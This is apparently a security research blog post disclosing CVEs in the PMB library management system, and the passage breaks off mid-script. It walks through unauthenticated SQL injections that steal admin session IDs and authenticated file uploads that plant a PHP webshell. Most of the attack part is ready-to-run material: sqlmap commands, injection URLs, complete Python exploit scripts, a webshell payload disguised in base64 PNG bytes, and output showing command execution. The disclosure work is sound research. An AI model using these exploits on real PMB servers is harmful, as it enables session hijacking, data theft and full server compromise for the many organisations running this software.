<meta content='https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a=w640-h118' itemprop='image_url'/>
<meta content='8777491027349637723' itemprop='blogId'/>
<meta content='554876999792156651' itemprop='postId'/>
<a name='554876999792156651'></a>
<h3 class='post-title entry-title' itemprop='name'>
A Journey Into Finding Vulnerabilities in the PMB Library Management System
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-554876999792156651' itemprop='articleBody'>
<head><meta name="keywords" content="SQL Injection, PMB, exploit, RCE, remote code execution, vulnerabilities, cve, fix"></head>
<p></p><h1><span style="font-family: Space Grotesk;">Introduction</span></h1><div><div><span style="font-family: Space Grotesk;"><br /></span></div><div><span style="font-family: Space Grotesk;">The following research was conducted by Nexa&#8217;s security team with the goal to contribute to the ongoing efforts to improve the security of open-source software and protect the organizations that rely on them.</span></div><div><span style="font-family: Space Grotesk;"><br /></span></div></div><div><span style="font-family: Space Grotesk;">In the search for open source projects to look for vulnerabilities, the idea of reviewing the code of a library system called PMB used by several well-known organizations came up. PMB, being an open-source project, provides an excellent opportunity for security researchers to study its codebase, identify potential vulnerabilities, and contribute to its security.</span></div><div><span style="font-family: Space Grotesk;"><br /></span></div><div><span style="font-family: Space Grotesk;"><span>According to </span><a href="https://en.wikipedia.org/wiki/PMB_(software)" target="_blank">Wikipedia</a><span>, "PMB is a fully featured open source integrated library system. It is continuously developed and maintained by the French company PMB Services."</span></span></div><div><span style="font-family: Space Grotesk;"><br /></span></div><div><span style="font-family: Space Grotesk;">For instance, using the following Google Dork, almost 5 million results were obtained, which indicates the widespread use of this software.</span></div><div><br /><div style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a"><img alt="" height="118" src="https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a=w640-h118" style="1px;border:thin solid black;" width="640" /></a></div></div><div style="text-align: center;"><span style="font-family: Space Grotesk;">Google search for PMB</span></div><div><span><br /></span></div><div><span><a></a></span><span><br /></span></div><h1><span style="font-family: Space Grotesk;">Plan</span></h1><div><span style="font-family: Space Grotesk;"><br /></span></div><div><span style="font-family: Space Grotesk;">The objective was to find critical impact vulnerabilities that would allow bypassing authentication and subsequently achieve remote command execution using authenticated components.</span></div><div><br /></div><div><div style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEiFkJfyUfXVetZiTF9IdeUrOuNMhMZLMaa9k4J-wp13qG-YL9-EjtlR9dZ4Zz-CQmYUgTdoiUMlXvrr8UWxfNR8wvlAV32gx0IZ_eUVFfBgYTSiRzh9gl77bzu-XpDyBS2I8UR6gl3sxVFVe8K4d5OYOQIu6vSdauz4dm-3ViY-sjEniqFMs-tnYuzZPyFH"><img alt="" height="472" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFkJfyUfXVetZiTF9IdeUrOuNMhMZLMaa9k4J-wp13qG-YL9-EjtlR9dZ4Zz-CQmYUgTdoiUMlXvrr8UWxfNR8wvlAV32gx0IZ_eUVFfBgYTSiRzh9gl77bzu-XpDyBS2I8UR6gl3sxVFVe8K4d5OYOQIu6vSdauz4dm-3ViY-sjEniqFMs-tnYuzZPyFH=w611-h472" style="1px;border:thin solid black;" width="611" /></a></div><div style="text-align: center;"><span style="font-family: Space Grotesk;">Authenticated and unauthenticated components</span></div><p><span></span></p><h1><span></span></h1><h1><span></span></h1><h1><span style="font-family: Space Grotesk;">Setup</span></h1><div><div><span style="font-family: Space Grotesk;"><br /></span></div><div><span style="font-family: Space Grotesk;">In order to conduct the research, a local environment composed of the following was prepared:</span></div><div><ul><li><span style="font-family: Space Grotesk;">Ubuntu 22.04 LTS instance.</span></li><li><span style="font-family: Space Grotesk;">PHP modules required to use the software (PMB).</span></li><li><span style="font-family: Space Grotesk;">A database server (MariaDB) with logging enabled to analyze the SQL queries performed by the application.</span></li><li><span style="font-family: Space Grotesk;">Xdebug and Visual Studio Code to debug the application.</span></li></ul></div></div><div><span></span></div><h1><span style="font-family: Space Grotesk;"><br /></span></h1><h1><span style="font-family: Space Grotesk;">Results</span></h1><p><span style="font-family: Space Grotesk;">The summary of the identified vulnerabilities is listed below (for PMB version 7.4.7 and earlier).</span></p>
<p><span style="font-family: Space Grotesk;"><b>Pre-authenticated vulnerabilities</b></span></p>
<ul>
<li><span style="font-family: Space Grotesk;">CVE-2023-52153: SQL injection in /pmb/opac_css/includes/sessions.inc.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS: <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">7.5</a> (High)</span></li></ul>
<li><span style="font-family: Space Grotesk;">CVE-2023-37177: SQL injection in /admin/convert/export_z3950.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS:&nbsp;<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">7.5</a>&nbsp;(High)</span></li></ul>
<li><span style="font-family: Space Grotesk;">CVE-2023-51828: SQL injection in /admin/convert/export_z3950_new.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS:&nbsp;<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">7.5</a>&nbsp;(High)</span></li></ul>
<li><span style="font-family: Space Grotesk;">CVE-2023-38844: SQL injection in export_skos.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS:&nbsp;<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">7.5</a>&nbsp;(High)</span></li></ul>
</ul>
<p><span style="font-family: Space Grotesk;"><b>Post-authenticated vulnerabilities</b></span></p>
<ul>
<li><span style="font-family: Space Grotesk;">Insecure file upload in /admin/convert/start_import.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS:&nbsp;<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H">7.2</a> (High)</span></li></ul>
<li><span style="font-family: Space Grotesk;">CVE-2023-52154: Insecure file upload in camera_upload.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS:&nbsp;<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H">7.2</a>&nbsp;(High)</span></li></ul>
<li><span style="font-family: Space Grotesk;">CVE-2023-52155: SQL injection to RCE in /admin/sauvegarde/run.php</span></li><ul><li><span style="font-family: Space Grotesk;">CVSS:&nbsp;<a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H">8.8</a>&nbsp;(High)</span></li></ul>
</ul>
</div>

<span style="font-family: Space Grotesk;"></span><h2><span><br /></span></h2><h1><span style="font-family: Space Grotesk;">Pre-auth vulnerabilities</span></h1><h3><span style="font-family: Space Grotesk;"><b><br /></b></span></h3><h3><span style="font-family: Space Grotesk;"><span>CVE-2023-52153:&nbsp;<b>Time-based <span>SQL Injection in session management component (</span></b></span><span>/pmb/opac_css/includes/sessions.inc.php</span><b><span>)</span></b></span></h3><div><br /></div><div><span style="font-family: Space Grotesk;">W</span><span style="font-family: &quot;Space Grotesk&quot;;">hen reviewing the code related to the session handling (</span><b style="font-family: &quot;Space Grotesk&quot;;">/pmb/opac_css/includes/sessions.inc.php</b><span style="font-family: &quot;Space Grotesk&quot;;">), the unsafe concatenation in SQL queries was identified. Also, the use of PHP's <b>addslashes()</b> function to escape some entries in the construction of SQL queries was noted.</span></div><pre><code>root@ubuntu:/var/www/html/pmb# batcat -pp opac_css/includes/sessions.inc.php | grep addslashes -n
59:	$query .= "SESSID='". addslashes($PHPSESSID) . "' and login = '".$PHPSESSLOGIN."'";
120:	define('SESSlogin'	, addslashes($PHPSESSLOGIN));
121:	define('SESSname'	, addslashes($SESSNAME));
122:	define('SESSid'		, addslashes($PHPSESSID));
241:	$query = "DELETE FROM sessions WHERE login='".addslashes($login)."'";
242:	$query .= " AND SESSNAME='".addslashes($SESSNAME)."' and SESSID='".addslashes($PHPSESSID)."'";
270:	$query .= "SESSID='".addslashes($PHPSESSID)."'";
  </code></pre>
<div style="font-family: &quot;Times New Roman&quot;; white-space: normal;"><span style="font-family: Space Grotesk;">Despite the use of the <b>addslashes()</b> function in multiple places, it can be noted that in the query constructed on line 59, which concatenates the value of the <b>PmbOpac-LOGIN</b> session cookie (declared in the <b>$PHPSESSLOGIN</b> variable), it is possible to inject arbitrary SQL queries.</span></div><div style="font-family: &quot;Times New Roman&quot;; white-space: normal;"><span style="font-family: Space Grotesk;"><br /></span></div><div style="font-family: &quot;Times New Roman&quot;; white-space: normal;"><span style="font-family: Space Grotesk;">The code for the vulnerable function (checkEmpr) is provided below. In this case, SQL queries are injected into a SELECT statement that validates the user's session identifier and its username.</span></div>
<pre><div><span><pre><code>28 function checkEmpr($SESSNAME, $allow=0,$user_connexion='') {
34     $checkempr_type_erreur = CHECK_EMPR_NO_SESSION ;
40     
42     $PHPSESSID = (isset($_COOKIE["$SESSNAME-SESSID"]) ? $_COOKIE["$SESSNAME-SESSID"] : '');
43     if ($user_connexion) {
44         $PHPSESSLOGIN = $user_connexion; 
45     } else {
46         if(isset($_COOKIE["$SESSNAME-LOGIN"])) {
47             $PHPSESSLOGIN = $_COOKIE["$SESSNAME-LOGIN"];
48         } else {
49             $PHPSESSLOGIN = '';
50         }
51     }
52     $PHPSESSNAME = (isset($_COOKIE["$SESSNAME-SESSNAME"]) ? $_COOKIE["$SESSNAME-SESSNAME"] : '');
53     
55     $ip = $_SERVER['REMOTE_ADDR'];
56 
58     $query = "SELECT SESSID, login, IP, SESSstart, LastOn, SESSNAME FROM sessions WHERE ";
59     $query .= "SESSID='". addslashes($PHPSESSID) . "' and login = '".$PHPSESSLOGIN."'";
60     $result = pmb_mysql_query($query);
61     $numlignes = pmb_mysql_num_rows($result);
  </code></pre></span></div><pre><span style="font-family: &quot;Space Grotesk&quot;; white-space: normal;">The vulnerability can be validated using a time-based SQL injection technique as in the following screenshot where a timeout of 5 seconds is produced.</span></pre>
<div style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEioWyiuM6wUmDrN3EV-TE2cJ2r4v86eBVKJM1vaoj0vc1nFuQSbwncOI96O5_eZ-UnalybnfP1a9Cy63KYBwkWpScEsGHQeBW0E1EqbO0XIBUqlWUO_1RfPY2Ao4rj0yCx-BL7_-v6O3rO6KHT8-hQwPbq7jjuv6RggAnPZiRanxFkpJRAneOqRVuMT8eYn"><img alt="" height="379" src="https://blogger.googleusercontent.com/img/a/AVvXsEioWyiuM6wUmDrN3EV-TE2cJ2r4v86eBVKJM1vaoj0vc1nFuQSbwncOI96O5_eZ-UnalybnfP1a9Cy63KYBwkWpScEsGHQeBW0E1EqbO0XIBUqlWUO_1RfPY2Ao4rj0yCx-BL7_-v6O3rO6KHT8-hQwPbq7jjuv6RggAnPZiRanxFkpJRAneOqRVuMT8eYn=w566-h379" width="566" /></a></div><div style="text-align: center;"><span style="font-family: Space Grotesk;">Confirming the SQL Injection</span></div><pre><pre><span style="font-family: Space Grotesk;"><span style="white-space: normal;">After confirming the existence of the vulnerability, the sessions of authenticated users were extracted using sqlmap with a time-based SQL injection technique.</span></span></pre><span style="font-family: Space Grotesk;"><span style="white-space: normal;"><b>Note:</b> The user's credentials could also be extracted from the database.</span></span></pre><pre><code>root@ubuntu:/var/www/html/pocs# sqlmap -u "http://127.0.0.1/pmb/opac_css/index.php" --cookie "PmbOpac-LOGIN=*" -v 3 --fresh-queries --sql-query "use bibli; SELECT SESSID FROM sessions WHERE login = 'admin';" --time-sec 3
SELECT SESSID FROM sessions WHERE login = 'admin' [1]:
[*] 3788863056</code></pre><pre><span style="font-family: Space Grotesk;">The extracted session identifier matches the session of the user "admin" where SESSNAME is PhpMyBibli.</span></pre></pre><pre><code>MariaDB [bibli]&gt; select * from sessions;
+------------+-------+-----------+------------+------------+------------+---------------+
| SESSID     | login | IP        | SESSstart  | LastOn     | SESSNAME   | notifications |
+------------+-------+-----------+------------+------------+------------+---------------+
| 3788863056 | admin | 127.0.0.1 | 1704409090 | 1704409940 | PhpMyBibli | NULL          |
| 4358633956 |       | 127.0.0.1 | 1704409266 | 1704409428 | PmbOpac    | NULL          |
| 5627396735 |       | 127.0.0.1 | 1704409428 | 1704409462 | PmbOpac    | NULL          |
| 8651032647 |       | 127.0.0.1 | 1704409528 | 1704409731 | PmbOpac    | NULL          |
| 5730435623 |       | 127.0.0.1 | 1704409744 | 1704409900 | PmbOpac    | NULL          |
| 3517240464 |       | 127.0.0.1 | 1704409915 | 1704410060 | PmbOpac    | NULL          |
+------------+-------+-----------+------------+------------+------------+---------------+
6 rows in set (0.000 sec)</code></pre>




<code><div><code><br /></code></div><div><code><span style="font-family: Space Grotesk;">After modifying the session cookie it is possible to authenticate as the administrator user.</span></code></div><div><code><span><br /></span></code></div><div><code><span><div style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjLXvgnNYhc_bZUyMGkdXK8EYakY_yim4zuALDNvSk_lr3c1rNpqdxb1fi5-gvZJP1TALnOtfRaTotC1er35fhV6RCFKca4xVYzGBd0SGoQHonnXejmN01kYVeLgGzRDup2qhBbgiebn47QLq3pPrOrArRBuDlCh58SKRBtz9dKmPjK3zuw4E61zJLPW2ln"><img alt="" height="176" src="https://blogger.googleusercontent.com/img/a/AVvXsEjLXvgnNYhc_bZUyMGkdXK8EYakY_yim4zuALDNvSk_lr3c1rNpqdxb1fi5-gvZJP1TALnOtfRaTotC1er35fhV6RCFKca4xVYzGBd0SGoQHonnXejmN01kYVeLgGzRDup2qhBbgiebn47QLq3pPrOrArRBuDlCh58SKRBtz9dKmPjK3zuw4E61zJLPW2ln=w638-h176" width="638" /></a></div><div style="text-align: center;"><span style="font-family: Space Grotesk;">Logged-in as admin</span></div><br /></span></code><h3><code></code></h3><h3><span></span><span><br /></span></h3><h3><span style="font-family: Space Grotesk;">CVE-2023-37177 and&nbsp;CVE-2023-51828: SQL Injection in /admin/convert/export_z3950.php and /admin/convert/export_z3950_new.php</span></h3></div><div><span><br /></span></div><div><div><span style="font-family: Space Grotesk;"><b>Note: </b>Both components (export_z3950_new.php and export_z3950.php) are vulnerable because they make use of the same function from the <b>/admin/convert/export.class.php</b> class.</span></div><div><span style="font-family: Space Grotesk;"><br /></span></div><div><span style="font-family: Space Grotesk;"><span>When analyzing the deauthenticated component accessible via the <b>/admin/convert/export_z3950.php</b> path, it was identified that it receives the GET parameters<b> "command"</b> and <b>"query"</b>. It then assigns the value of the <b>query parameter</b> to the variable <b>$id</b> and calls the&nbsp;<b>get_next_notice&nbsp;</b></span><span>function</span><span>.</span></span></div><pre><code>33 $command=$_GET["command"];
35 $query=$_GET["query"];

&lt;..&gt;

130 case "get_notice":
131   $id=$query;
132   $e = new export(array($id));
133   $e -&gt; get_next_notice();
134   $toiso = new xml_unimarc();
135   $toiso-&gt;XMLtoiso2709_notice($e-&gt;notice);
136   echo "0@No errors@";
137   echo $toiso-&gt;notices_[0];
138   break;</code></pre>

  
  
</div><div><span style="font-family: Space Grotesk;">The get_next_notice function in <b>/admin/convert/export.class.php</b> is vulnerable to SQL injections due to the insecure concatenation of the <b>notice_id</b> in the construction of an SQL query.</span></div></code><pre><code>297 if ($this-&gt;current_notice != -1) {
299   $requete = "select * from notices where notice_id=".$this-&gt;notice_list[$this-&gt;current_notice];
300   $resultat = pmb_mysql_query($requete);
301   $res = pmb_mysql_fetch_object($resultat);
			
303   if (!$res)
304     return false;</code></pre><div><span>To verify the existence of this vulnerability, a boolean-based SQL injection technique can be used:</span></div>
<pre><code>True condition (content is returned):
http://host/pmb/admin/convert/export_z3950.php?command=get_notice&amp;query=9999%20or%201=1%20limit%201

False condition (returned content is empty):
http://host/pmb/admin/convert/export_z3950.php?command=get_notice&amp;query=9999%20or%201=2%20limit%201</code></pre>
<div><span style="font-family: Space Grotesk;">After verifying the existence of the vulnerability, the session cookies are extracted from the database with the following script (using an union-based SQL injection technique).</span></div><pre><code>#!/usr/bin/env python3
import requests
import sys
import re
import random
import argparse

def exploit(notice_id):
    for i in range(30,70):
        columns = "1," * i
        url = "{0}/admin/convert/export_z3950.php?command=get_notice&amp;query={1}%20UNION%20SELECT%20(select+group_concat('(',SESSID,')','\\n')+from+sessions),{2}%20limit%201,1".format(args.pmb_url, notice_id, columns[:-1])
        headers = {"Connection": "close"}
        r = requests.get(url, headers=headers)
        sessid_list = re.findall('\((\d{10})\)', r.text)
        if sessid_list:
            print(sessid_list)
            return True
    if not sessid_list:
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='', description='SQL Injection in export_z3950.php (Steal PhpMyBibli-SESSID)', epilog='Text at the bottom of help')
    parser.add_argument('pmb_url', type=str, help='PMB\'s URL (e.g. http://127.0.0.1/pmb or http://127.0.0.1)')
    parser.add_argument('--notice_id', type=str, help='Custom notice id (if undefined, fuzzing will be performed)',required=False)
    parser.add_argument("--verbose", help="Increase output verbosity", action="store_true")
    args = parser.parse_args()

    if args.notice_id:
        exploit(args.notice_id)

    if not args.notice_id:
        while True:
            notice_id = random.randint(1, 300)
            result = exploit(notice_id)
            if args.verbose:
                print("Fuzzing notice_id: {0}, Result={1}".format(notice_id, result))
            if result:
                break</code></pre><div><code><span style="font-family: Space Grotesk;">The result of the script returns a list of sessions:</span></code></div><pre><code>root@ubuntu:/var/www/html/pocs# python3 Union-SQLI-export_z3950.py http://127.0.0.1/pmb/
['1886627101', '3239147683', '3324994107', '3788863056', '4604414197', '5080229282', '7066911231', '7152832893']</code></pre><h1><span></span></h1><h3><span><span><br /></span></span></h3><h3><span><span style="font-family: Space Grotesk;">CVE-2023-38844: SQL Injection in export_skos.php</span></span></h3><div><span><span><br /></span></span></div><div><span><div><span style="font-family: Space Grotesk;">Finishing with unauthenticated SQL injections, the following vulnerability is detailed, which refers to a SQL injection through the thesaurus parameter of the <b>/devel/export_skos.php</b> path.</span></div><div><span style="font-family: Space Grotesk;"><br />When analyzing the code of the <b>/devel/export_skos.php</b> file, it is possible to observe the unsafe concatenation of a user-supplied input (the <b>$numt</b> variable) in an SQL query.</span></div>
<pre><code>$numt = $_GET["thesaurus"];
(...)

$res = pmb_mysql_query("select * from thesaurus where id_thesaurus=".$numt);
$rt = pmb_mysql_fetch_object($res);</code></pre><div><span style="font-family: Space Grotesk;">To verify the existence of this vulnerability, a boolean-based SQL injection technique can be used as in the previous case (SQL Injection in <b>/admin/convert/export_z3950.php</b>).</span></div><div>
  <pre><code>True condition (content is returned): 
http://host/devel/export_skos.php?tname=%0a&amp;prefix=&amp;thesaurus=1%20or%201=1

False condition (returned content is empty):
http://host/devel/export_skos.php?tname=%0a&amp;prefix=&amp;thesaurus=1%20or%201=2</code></pre></div><div>
  <div><span style="font-family: Space Grotesk;">Additionally, after confirming the existence of the vulnerability, the session cookies are extracted with the following script (using a union-based SQL injection technique).</span>
    <pre><code>#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore")
import requests
import sys
import re
import random
import argparse

def exploit():
    for i in range(3,15):
        columns = "1," * i
        url = "{0}/devel/export_skos.php?tname=%0a&amp;prefix=&amp;thesaurus=1+union+select+1,(select+group_concat(SESSID,'\\n')+COLLATE+utf8_general_ci+from+sessions),{1}+limit+1,1".format(args.pmb_url, columns[:-1])
        headers = {"Connection": "close"}
        r = requests.get(url, headers=headers)
        sessid_list = re.findall('\d{10}', r.text)
        if sessid_list:
            print(sessid_list)
            break
    if not sessid_list:
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='', description='SQL Injection in export_skos.php (Steal PhpMyBibli-SESSID)', epilog='Text at the bottom of help')
    parser.add_argument('pmb_url', type=str, help='PMB\'s URL (e.g. http://127.0.0.1/pmb or http://127.0.0.1)')
    args = parser.parse_args()

    exploit()</code></pre><div><code><span style="font-family: Space Grotesk;">The results obtained match the information extracted from the database with the vulnerability of the previous case (SQL Injection in <b>/admin/convert/export_z3950.php</b>).</span></code></div>
<pre><code>root@ubuntu:/var/www/html/pocs# python3 Union-SQLI-export_skos.py http://127.0.0.1/pmb/
['1886627101', '3239147683', '3324994107', '3788863056', '4604414197', '5080229282', '7066911231', '7152832893']</code></pre><h2><code><span></span></code></h2><div><code><br /></code></div><h1><span style="font-family: Space Grotesk;">Post-auth vulnerabilities</span></h1><div><code><span style="font-family: Space Grotesk;"><br /></span></code></div><div><code><span style="font-family: Space Grotesk;">After showing multiple unauthenticated vulnerabilities that allow obtaining an authenticated session, the following authenticated vulnerabilities are detailed, which enable the execution of commands on the server (RCE).</span></code></div><div><code><span><br /></span></code></div><h3><code><span style="font-family: Space Grotesk; font-size: medium;">Insecure File Upload in /admin/convert/start_import.php</span></code></h3><div><b><br /></b></div><div><span style="font-family: Space Grotesk;"><b>Note: </b><span>The CVE for this vulnerability was assigned to another security researcher</span><span>.</span></span></div><div><code><span style="font-family: Space Grotesk;"><br /></span></code></div><div><code><div><span style="font-family: Space Grotesk;">Insecure file upload vulnerability in <b>/admin/convert/start_import.php</b> allows arbitrary file upload. In this case, it is due to the lack of validation of file extensions (phtml, php, etc) that can be interpreted by the application server.</span></div><div><span style="font-family: Space Grotesk;"><br />As can be seen in the following code snippet, the uploaded file is stored in a temporary path ($base_path/temp/example_file.txt).</span></div>
<pre><code>124  if ($_FILES['import_file']['name']) {
125    if (!@ copy($_FILES['import_file']['tmp_name'], "$base_path/temp/".$origine.$_FILES['import_file']['name'])) {
126      error_message_history($msg["ie_tranfert_error"], $msg["ie_transfert_error_detail"], 1);
127      exit;

&lt;...&gt;</code></pre><div><code><span style="font-family: Space Grotesk;">After the file is uploaded via the <b>/admin/convert/start_import.php</b> route, the PHP file is accessible via the <b>/pmb/temp/shell.php</b> application&#8217;s path.</span></code></div><div><pre><code>POST /admin/convert/start_import.php?bidon=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------15247239112720740484965183530
Cookie: PhpMyBibli-LOGIN=admin; PhpMyBibli-SESSID=test
Content-Length: 404

-----------------------------15247239112720740484965183530
Content-Disposition: form-data; name="import_file"; filename="shell.php"
Content-Type: application/x-php


&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
-----------------------------15247239112720740484965183530
Content-Disposition: form-data; name="import_type"

2
-----------------------------15247239112720740484965183530</code></pre>



  
  </div><div><code><span><br /></span></code></div><div><span style="font-family: Space Grotesk;">To automate the process of uploading a webshell and executing a command, the following proof of concept was developed. It iterates over various session identifiers to upload a file and subsequently execute it.</span><div>
  
 <pre><code>#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore")
import requests
import argparse
import re

def upload_webshell(url, cookies):
    data = "-----------------------------15247239112720740484965183530\r\nContent-Disposition: form-data; name=\"import_file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;\n\r\n-----------------------------15247239112720740484965183530\r\nContent-Disposition: form-data; name=\"import_type\"\r\n\r\n2\r\n-----------------------------15247239112720740484965183530\r\n"
    url = "{0}/admin/convert/start_import.php?bidon=1".format(url)
    headers = {"Content-Type": "multipart/form-data; boundary=---------------------------15247239112720740484965183530"}

    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    filename = re.findall('\d{18}shell.php', r.text)
    if filename:
        print("Webshell URL: {0}/temp/{1}".format(args.pmb_url, filename[0]))
        return filename
    
def execute_command(url, filename, command):
    url = "{0}/temp/{1}?cmd={2}".format(url, filename, command)
    r =  requests.get(url)
    return r.text

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='', description='File Upload in start_import.php (RCE)', epilog='Text at the bottom of help')
    parser.add_argument('pmb_url', type=str, help='PMB\'s URL (e.g. http://127.0.0.1/pmb or http://127.0.0.1)')
    parser.add_argument('--sessid', type=str, help='PhpMyBibli-SESSID',required=False)
    parser.add_argument('--sessid_list', nargs='+', help='PhpMyBibli-SESSID',required=False)
    parser.add_argument('--command', type=str, help='Execute custom command',required=False)
    args = parser.parse_args()

    if not args.sessid:
        if not args.sessid_list:
            exit()

    sessid_list = []

    status = False

    url = "{0}/".format(args.pmb_url)
    command = args.command

    if args.sessid:
        sessid_list.append(args.sessid)
    elif args.sessid_list:
        sessid_list = args.sessid_list

    for sessid in sessid_list:
        cookies = {"PhpMyBibli-LOGIN": "admin", "PhpMyBibli-SESSID": sessid}

        filename = upload_webshell(url, cookies)
        if filename:
            status = True
            if command:
                print(execute_command(url, filename[0], command))
        if status:
            break</code></pre><div><code><span style="font-family: Space Grotesk;">When executed, passing it the list of session identifiers obtained with the proof of concept shown in the "SQL Injection in export_skos.php" vulnerability, the file upload is confirmed and the "id" command is executed:</span></code></div>
<pre><code>root@ubuntu:/var/www/html/pocs# python3 Union-SQLI-export_skos.py http://127.0.0.1/pmb/                                                                                                                    
['1293437551', '1886627101', '3239147683', '3324994107', '3788863056', '4604414197', '5080229282', '7066911231', '7152832893']                                                                             
root@ubuntu:/var/www/html/pocs# python3 File-Upload-start_import.py --sessid_list 1293437551 1886627101 3239147683 3324994107 --command "id" http://127.0.0.1/pmb/                                         
Webshell URL: http://127.0.0.1/pmb//temp/751252001704414377shell.php                                                                                                                                       
uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><pre><span></span></pre>

  <p></p>
<h3><br /></h3><h3><span style="font-family: Space Grotesk;">CVE-2023-52154: Insecure File Upload in camera_upload.php</span></h3><div><p><span style="font-family: Space Grotesk;">Additionally, another arbitrary file upload vulnerability was identified in the <b>camera_upload.php</b> component. Similar to the previous file upload vulnerability, it allows the upload of PHTML files that are accessible through the application's webroot (e.g. <b>/pmb/uploaded_file.phtml</b>) to achieve remote code execution on the server.</span></p>
<p><span style="font-family: Space Grotesk;">In the following code, the base64 encoded value sent using the data URI scheme (data://) that refers to the image content is extracted and then stored on the server.</span></p>
  <pre><code>try {
    $uploadImage = new UploadImage($dir, $filename);

    $filteredData = explode(',', $_POST['imgBase64']) ?? [];
    $imageString = base64_decode($filteredData[1] ?? "");

    $uploadImage-&gt;setImageString($imageString);
} catch (\Exception $e) {
    response(0, $e-&gt;getMessage());
}

if ($uploadImage-&gt;moveImage()) {
    response(1, "File uploaded !");
}</code></pre><div><code><span style="font-family: Space Grotesk;">In this case, it was necessary to include the magic bytes of a PNG image in the file to be uploaded:</span></code></div>
<pre><code>root@ubuntu:/var/www/html/pocs# echo iVBORw0KGgo= | base64 -d | xxd
00000000: 8950 4e47 0d0a 1a0a                      .PNG....
root@ubuntu:/var/www/html/pocs# echo iVBORw0KGgoAAAANSUhEUgAAPD9waHAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSl7c3lzdGVtKCRfR0VUWydjbWQnXSk7fSA/Pg== | base64 -d &gt; file.png
root@ubuntu:/var/www/html/pocs# file file.png
file.png: PNG image data, 15423 x 1885892640, 105-bit
root@ubuntu:/var/www/html/pocs# cat file.png
PNG

IHDR&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</code></pre><div><code><span style="font-family: Space Grotesk;">The PHTML webshell is uploaded through the path <b>"/camera_upload.php"</b>. The "data://" scheme is employed to specify both the file type (image/png) and the content encoding (base64).</span></code></div>
</div>
<pre><code>POST /camera_upload.php
Host: 127.0.0.1
Cookie: PhpMyBibli-LOGIN=admin; PhpMyBibli-SESSID=</code></pre><div><span style="font-family: Space Grotesk;">The following proof of concept was successfully tested and exploited in PMB version 7.4.6.</span></div>
<pre><code><pre><code></code></pre>#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore")
import requests
import argparse
import random
import string

def upload_webshell(url, cookies, headers, filename):
    data = {"upload_filename": "{0}.phtml".format(filename), "imgBase64": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAPD9waHAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSl7c3lzdGVtKCRfR0VUWydjbWQnXSk7fSA/Pg=="}
    url = "{0}/camera_upload.php".format(url)
    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    if "{0}.phtml".format(filename) in r.text:
        return True
    
def execute_command(url, filename, command):
    r = requests.get("{0}/{1}.phtml?cmd={2}".format(url, filename, command))
    return r.text

def clean_webshell(url, cookies, headers, filename):
    data = {"upload_filename": "{0}.phtml".format(filename), "imgBase64": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA=="}
    url = "{0}/camera_upload.php".format(url)
